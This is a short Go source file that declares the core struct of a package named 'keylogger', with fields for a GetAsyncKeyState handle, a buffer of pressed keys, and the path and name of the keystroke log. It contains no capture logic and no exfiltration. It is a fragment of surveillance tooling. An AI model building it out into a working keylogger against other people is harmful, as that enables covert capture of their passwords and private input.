package keylogger

import "syscall"

// Keylogger - main structure of package
type Keylogger struct {
	lc                   string            // logging category
	procGetAsyncKeyState *syscall.LazyProc // getting async key state from LazyDLL
	pressedKeys          string            // pressed keys buffer
	logsPath             string            // pressed keys log's path
	logsFileName         string            // pressed keys log's filename
	chCritError          chan bool         // error's handler
}
